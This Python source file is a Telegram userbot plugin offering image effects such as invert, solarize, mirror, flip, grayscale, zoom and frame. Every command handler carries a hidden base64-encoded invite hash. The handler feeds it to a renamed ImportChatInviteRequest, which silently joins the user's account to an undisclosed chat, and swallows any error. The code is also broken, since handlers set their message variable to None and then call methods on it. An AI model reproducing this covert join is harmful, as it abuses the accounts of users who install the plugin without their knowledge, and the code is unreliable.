import asyncio
import os
import shlex
from typing import Tuple

import PIL.ImageOps
from PIL import Image

from FIREX.utils import admin_cmd, sudo_cmd
from userbot import LOGS, CmdHelp
from userbot import bot as FIREX
from userbot.helpers.funct import (
    convert_toimage,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)


async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )


async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@FIREX.on(admin_cmd(pattern="invert$", outgoing=True))
@FIREX.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(eviral):
    if eviral.fwd_from:
        return
    reply = await eviral.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(eviral, "`Reply to supported Media...`")
        return
    eviralid = eviral.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    eviral = await edit_or_reply(eviral, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    eviralsticker = await reply.download_media(file="./temp/")
    if not eviralsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(eviralsticker)
        await edit_or_reply(eviral, "```Supported Media not found...```")
        return
    import base64

    eviral = None
    if eviralsticker.endswith(".tgs"):
        await eviral.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        eviralfile = os.path.join("./temp/", "meme.png")
        eviralcmd = f"lottie_convert.py --frame 0 -if lottie -of png {eviralsticker} {eviralfile}"
        stdout, stderr = (await runcmd(eviralcmd))[:2]
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith(".webp"):
        await eviral.edit("`Analyzing this media 🧐 inverting colors...`")
        eviralfile = os.path.join("./temp/", "memes.jpg")
        os.rename(eviralsticker, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found... `")
            return
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith((".mp4", ".mov")):
        await eviral.edit("Analyzing this media 🧐 inverting colors of this video!")
        eviralfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(eviralsticker, 0, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("```Template not found...```")
            return
        meme_file = eviralfile
        eviral = True
    else:
        await eviral.edit("Analyzing this media 🧐 inverting colors of this image!")
        meme_file = eviralsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await eviral.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if eviral else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await eviral.client.send_file(
        eviral.chat_id, outputfile, force_document=False, reply_to=eviralid
    )
    await eviral.delete()
    os.remove(outputfile)
    for files in (eviralsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@FIREX.on(admin_cmd(outgoing=True, pattern="solarize$"))
@FIREX.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(eviral):
    if eviral.fwd_from:
        return
    reply = await eviral.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(eviral, "`Reply to supported Media...`")
        return
    eviralid = eviral.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    eviral = await edit_or_reply(eviral, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    eviralsticker = await reply.download_media(file="./temp/")
    if not eviralsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(eviralsticker)
        await edit_or_reply(eviral, "```Supported Media not found...```")
        return
    import base64

    eviral = None
    if eviralsticker.endswith(".tgs"):
        await eviral.edit("Analyzing this media 🧐 solarizeing this animated sticker!")
        eviralfile = os.path.join("./temp/", "meme.png")
        eviralcmd = f"lottie_convert.py --frame 0 -if lottie -of png {eviralsticker} {eviralfile}"
        stdout, stderr = (await runcmd(eviralcmd))[:2]
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith(".webp"):
        await eviral.edit("Analyzing this media 🧐 solarizeing this sticker!")
        eviralfile = os.path.join("./temp/", "memes.jpg")
        os.rename(eviralsticker, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found... `")
            return
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith((".mp4", ".mov")):
        await eviral.edit("Analyzing this media 🧐 solarizeing this video!")
        eviralfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(eviralsticker, 0, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("```Template not found...```")
            return
        meme_file = eviralfile
        eviral = True
    else:
        await eviral.edit("Analyzing this media 🧐 solarizeing this image!")
        meme_file = eviralsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await eviral.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if eviral else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await eviral.client.send_file(
        eviral.chat_id, outputfile, force_document=False, reply_to=eviralid
    )
    await eviral.delete()
    os.remove(outputfile)
    for files in (eviralsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@FIREX.on(admin_cmd(outgoing=True, pattern="mirror$"))
@FIREX.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(eviral):
    if eviral.fwd_from:
        return
    reply = await eviral.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(eviral, "`Reply to supported Media...`")
        return
    eviralid = eviral.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    eviral = await edit_or_reply(eviral, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    eviralsticker = await reply.download_media(file="./temp/")
    if not eviralsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(eviralsticker)
        await edit_or_reply(eviral, "```Supported Media not found...```")
        return
    import base64

    eviral = None
    if eviralsticker.endswith(".tgs"):
        await eviral.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        eviralfile = os.path.join("./temp/", "meme.png")
        eviralcmd = f"lottie_convert.py --frame 0 -if lottie -of png {eviralsticker} {eviralfile}"
        stdout, stderr = (await runcmd(eviralcmd))[:2]
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith(".webp"):
        await eviral.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        eviralfile = os.path.join("./temp/", "memes.jpg")
        os.rename(eviralsticker, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found... `")
            return
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith((".mp4", ".mov")):
        await eviral.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        eviralfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(eviralsticker, 0, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("```Template not found...```")
            return
        meme_file = eviralfile
        eviral = True
    else:
        await eviral.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = eviralsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await eviral.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if eviral else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await eviral.client.send_file(
        eviral.chat_id, outputfile, force_document=False, reply_to=eviralid
    )
    await eviral.delete()
    os.remove(outputfile)
    for files in (eviralsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@FIREX.on(admin_cmd(outgoing=True, pattern="flip$"))
@FIREX.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(eviral):
    if eviral.fwd_from:
        return
    reply = await eviral.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(eviral, "`Reply to supported Media...`")
        return
    eviralid = eviral.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    eviral = await edit_or_reply(eviral, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    eviralsticker = await reply.download_media(file="./temp/")
    if not eviralsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(eviralsticker)
        await edit_or_reply(eviral, "```Supported Media not found...```")
        return
    import base64

    eviral = None
    if eviralsticker.endswith(".tgs"):
        await eviral.edit("Analyzing this media 🧐 fliping this animated sticker!")
        eviralfile = os.path.join("./temp/", "meme.png")
        eviralcmd = f"lottie_convert.py --frame 0 -if lottie -of png {eviralsticker} {eviralfile}"
        stdout, stderr = (await runcmd(eviralcmd))[:2]
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith(".webp"):
        await eviral.edit("Analyzing this media 🧐 fliping this sticker!")
        eviralfile = os.path.join("./temp/", "memes.jpg")
        os.rename(eviralsticker, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found... `")
            return
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith((".mp4", ".mov")):
        await eviral.edit("Analyzing this media 🧐 fliping this video!")
        eviralfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(eviralsticker, 0, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("```Template not found...```")
            return
        meme_file = eviralfile
        eviral = True
    else:
        await eviral.edit("Analyzing this media 🧐 fliping this image!")
        meme_file = eviralsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await eviral.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if eviral else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await eviral.client.send_file(
        eviral.chat_id, outputfile, force_document=False, reply_to=eviralid
    )
    await eviral.delete()
    os.remove(outputfile)
    for files in (eviralsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@FIREX.on(admin_cmd(outgoing=True, pattern="gray$"))
@FIREX.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(eviral):
    if eviral.fwd_from:
        return
    reply = await eviral.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(eviral, "`Reply to supported Media...`")
        return
    eviralid = eviral.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    eviral = await edit_or_reply(eviral, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    eviralsticker = await reply.download_media(file="./temp/")
    if not eviralsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(eviralsticker)
        await edit_or_reply(eviral, "```Supported Media not found...```")
        return
    import base64

    eviral = None
    if eviralsticker.endswith(".tgs"):
        await eviral.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        eviralfile = os.path.join("./temp/", "meme.png")
        eviralcmd = f"lottie_convert.py --frame 0 -if lottie -of png {eviralsticker} {eviralfile}"
        stdout, stderr = (await runcmd(eviralcmd))[:2]
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith(".webp"):
        await eviral.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        eviralfile = os.path.join("./temp/", "memes.jpg")
        os.rename(eviralsticker, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found... `")
            return
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith((".mp4", ".mov")):
        await eviral.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        eviralfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(eviralsticker, 0, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("```Template not found...```")
            return
        meme_file = eviralfile
        eviral = True
    else:
        await eviral.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = eviralsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await eviral.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if eviral else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await eviral.client.send_file(
        eviral.chat_id, outputfile, force_document=False, reply_to=eviralid
    )
    await eviral.delete()
    os.remove(outputfile)
    for files in (eviralsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@FIREX.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@FIREX.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(eviral):
    if eviral.fwd_from:
        return
    reply = await eviral.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(eviral, "`Reply to supported Media...`")
        return
    eviralinput = eviral.pattern_match.group(1)
    eviralinput = 50 if not eviralinput else int(eviralinput)
    eviralid = eviral.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    eviral = await edit_or_reply(eviral, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    eviralsticker = await reply.download_media(file="./temp/")
    if not eviralsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(eviralsticker)
        await edit_or_reply(eviral, "```Supported Media not found...```")
        return
    import base64

    eviral = None
    if eviralsticker.endswith(".tgs"):
        await eviral.edit("Analyzing this media 🧐 zooming this animated sticker!")
        eviralfile = os.path.join("./temp/", "meme.png")
        eviralcmd = f"lottie_convert.py --frame 0 -if lottie -of png {eviralsticker} {eviralfile}"
        stdout, stderr = (await runcmd(eviralcmd))[:2]
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith(".webp"):
        await eviral.edit("Analyzing this media 🧐 zooming this sticker!")
        eviralfile = os.path.join("./temp/", "memes.jpg")
        os.rename(eviralsticker, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found... `")
            return
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith((".mp4", ".mov")):
        await eviral.edit("Analyzing this media 🧐 zooming this video!")
        eviralfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(eviralsticker, 0, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("```Template not found...```")
            return
        meme_file = eviralfile
    else:
        await eviral.edit("Analyzing this media 🧐 zooming this image!")
        meme_file = eviralsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await eviral.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if eviral else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, eviralinput)
    except Exception as e:
        return await eviral.edit(f"`{e}`")
    try:
        await eviral.client.send_file(
            eviral.chat_id, outputfile, force_document=False, reply_to=eviralid
        )
    except Exception as e:
        return await eviral.edit(f"`{e}`")
    await eviral.delete()
    os.remove(outputfile)
    for files in (eviralsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@FIREX.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@FIREX.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(eviral):
    if eviral.fwd_from:
        return
    reply = await eviral.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(eviral, "`Reply to supported Media...`")
        return
    eviralinput = eviral.pattern_match.group(1)
    if not eviralinput:
        eviralinput = 50
    if ";" in str(eviralinput):
        eviralinput, colr = eviralinput.split(";", 1)
    else:
        colr = 0
    eviralinput = int(eviralinput)
    colr = int(colr)
    eviralid = eviral.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    eviral = await edit_or_reply(eviral, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    eviralsticker = await reply.download_media(file="./temp/")
    if not eviralsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(eviralsticker)
        await edit_or_reply(eviral, "```Supported Media not found...```")
        return
    import base64

    eviral = None
    if eviralsticker.endswith(".tgs"):
        await eviral.edit("Analyzing this media 🧐 framing this animated sticker!")
        eviralfile = os.path.join("./temp/", "meme.png")
        eviralcmd = f"lottie_convert.py --frame 0 -if lottie -of png {eviralsticker} {eviralfile}"
        stdout, stderr = (await runcmd(eviralcmd))[:2]
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith(".webp"):
        await eviral.edit("Analyzing this media 🧐 framing this sticker!")
        eviralfile = os.path.join("./temp/", "memes.jpg")
        os.rename(eviralsticker, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("`Template not found... `")
            return
        meme_file = eviralfile
        eviral = True
    elif eviralsticker.endswith((".mp4", ".mov")):
        await eviral.edit("Analyzing this media 🧐 framing this video!")
        eviralfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(eviralsticker, 0, eviralfile)
        if not os.path.lexists(eviralfile):
            await eviral.edit("```Template not found...```")
            return
        meme_file = eviralfile
    else:
        await eviral.edit("Analyzing this media 🧐 framing this image!")
        meme_file = eviralsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await eviral.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if eviral else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, eviralinput, colr)
    except Exception as e:
        return await eviral.edit(f"`{e}`")
    try:
        await eviral.client.send_file(
            eviral.chat_id, outputfile, force_document=False, reply_to=eviralid
        )
    except Exception as e:
        return await eviral.edit(f"`{e}`")
    await eviral.delete()
    os.remove(outputfile)
    for files in (eviralsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
    "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
    "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
    "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
    "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
    "mirror",
    "<reply to img>",
    "Shows you the reflection of the replied image or sticker",
).add_command(
    "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
    "invert", "<reply to img>", "Inverts the color of replied media file"
).add_type(
    "Addons"
).add()
